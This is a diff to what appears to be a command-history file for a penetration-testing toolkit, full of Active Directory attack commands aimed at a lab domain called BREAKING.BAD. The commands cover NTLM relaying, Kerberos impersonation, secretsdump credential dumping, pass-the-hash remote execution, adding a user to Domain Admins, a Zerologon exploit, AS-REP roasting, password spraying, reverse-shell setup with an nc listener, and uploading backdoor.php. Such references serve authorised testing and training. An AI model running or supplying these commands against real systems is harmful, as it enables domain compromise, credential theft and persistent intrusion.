@@ -13,15 +13,15 @@ dementor.py -d breaking.bad -u anonymous -p anonymous 192.168.56.1 DC02.BREAKING
 ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --add-computer SHUTDOWN --delegate-access
 ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --remove-mic --add-computer SHUTDOWN --delegate-access
 ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --remove-mic --add-computer SHUTDOWN 123soleil --delegate-access
-ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --escalate-user SHUTDOWN
+ntlmrelayx -t ldap://DC01.BREAKING.BAD -smb2support --escalate-user SHUTDOWN
 getST.py -spn host/DC02.BREAKING.BAD -impersonate Administrator -dc-ip 192.168.56.101 BREAKING.BAD/'SHUTDOWN$':123soleil
 getST.py -spn host/SV01.BREAKING.BAD -impersonate Administrator -dc-ip 192.168.56.101 BREAKING.BAD/'SHUTDOWN$':123soleil
 secretsdump -k DC02.BREAKING.BAD
 secretsdump -just-dc -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
 rpcclient -U '' -N DC01.BREAKING.BAD
 rpcclient -U BREAKING/anonymous 192.168.56.101
-pth-net rpc group members "Domain admins" -U BREAKING.BAD/Administrator%ffffffffffffffffffffffffffffffff:a88baa3fdc8f581ee0fb05d7054d43e4 -S DC01.BREAKING.BAD
-pth-net rpc group addmem "Domain admins" Shutdown -U BREAKING.BAD/Administrator%ffffffffffffffffffffffffffffffff:a88baa3fdc8f581ee0fb05d7054d43e4 -S DC01.BREAKING.BAD
+pth-net rpc group members 'Domain admins' -U 'BREAKING.BAD'/'Administrator'%'ffffffffffffffffffffffffffffffff':'a88baa3fdc8f581ee0fb05d7054d43e4' -S 'DC01.BREAKING.BAD'
+pth-net rpc group addmem 'Domain admins' 'Shutdown' -U 'BREAKING.BAD'/'Administrator'%'ffffffffffffffffffffffffffffffff':'a88baa3fdc8f581ee0fb05d7054d43e4' -S 'DC01.BREAKING.BAD'
 cme smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
 crackmapexec smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
 mitm6 --interface eth0
@@ -38,6 +38,7 @@ psexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@S
 smbexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 wmiexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 atexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
+dcomexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 dcomexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 cme smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy
 cme smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=exegol4thewin
@@ -101,6 +102,7 @@ kadimus --cookie 'PHPSESSID=qsh5s21mo54qds7v5384f1q34' -u 'http://192.168.10.10/
 shellerator --reverse-shell --ip 192.168.56.1 --port 1337 --type powershell
 shellerator
 rlwrap nc -lvnp 1337
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt BREAKING.BAD/
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt BREAKING.BAD/anonymous:anonymous
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile users.txt -dc-ip 192.168.56.101 BREAKING.BAD/
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator
@@ -155,18 +157,19 @@ cme smb 192.168.56.101 --continue-on-success --no-bruteforce -u users.txt -p pas
 crackmapexec smb 192.168.56.101 --continue-on-success --no-bruteforce -u users.txt -p passwords.txt
 crackmapexec smb 192.168.56.101 --continue-on-success -u users.txt -p passwords.txt
 smbpasswd -U BREAKING/serviceaccount -r 192.168.56.101
-enum4linux-ng -A 192.168.59.101
 enum4linux-ng -A -u BREAKING/serviceaccount -p 'P@ssword' 192.168.56.101
-enum4linux-ng -I -u BREAKING/serviceaccount -p 'P@ssword' 192.168.56.101
+enum4linux-ng -A 192.168.59.101
+enum4linux-ng -L 192.168.59.101
 nmap -sS -p 3268,3269 192.168.56.0/24
 nmap -sC -sV -p 139,445,80,21 192.168.56.201
 nmap -Pn -v -sS -F 192.168.56.0/24
 curl http://192.168.10.10/ --upload-file backdoor.php -v
-net rpc password someuser -U BREAKING/anotheruser%'P@ssword' -S DC01.BREAKING.BAD
-net rpc password someuser -U BREAKING/anotheruser -S DC01.BREAKING.BAD
-pth-net rpc password someuser -U BREAKING/anotheruser%ffffffffffffffffffffffffffffffff:c1c635aa12ae60b7fe39e28456a7bac6 -S DC01.BREAKING.BAD
+net rpc password 'someuser' 'somepassword' -U 'BREAKING.BAD'/'anotheruser'%'P@ssword' -S 'DC01.BREAKING.BAD'
+net rpc user add 'someuser' 'somepassword' -U 'BREAKING.BAD'/'anotheruser'%'P@ssword' -S 'DC01.BREAKING.BAD'
+pth-net rpc password 'someuser' 'somepassword' -U 'BREAKING.BAD'/'anotheruser'%'ffffffffffffffffffffffffffffffff':'c1c635aa12ae60b7fe39e28456a7bac6' -S 'DC01.BREAKING.BAD'
 zerologon-scan DC01 192.168.56.101
 zerologon-exploit DC01 192.168.56.101
+secretsdump -no-pass 'BREAKING.BAD'/'DC01$'@'dc01.breaking.bad'
 secretsdump -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
 zerologon-restore breaking/dc01@dc01 -target-ip 192.168.56.101 -hexpass 69762...6945d
 pm3 -p /dev/ttyACM0
@@ -179,3 +182,5 @@ ruler -k -d example.com brute --users owa-valid-users.txt --passwords passwords.
 oaburl.py MEGACORP/j.doe:'Passw0rd!'@mx.example.com -e existent.email@example.com
 cypheroth -u neo4j -p exegol4thewin -d BREAKING.BAD
 nmap -sS -n --open -p 88 192.168.56.0/24
+windapsearch --dc 10.10.10.161 --module metadata
+windapsearch --dc 10.10.10.161 --module users
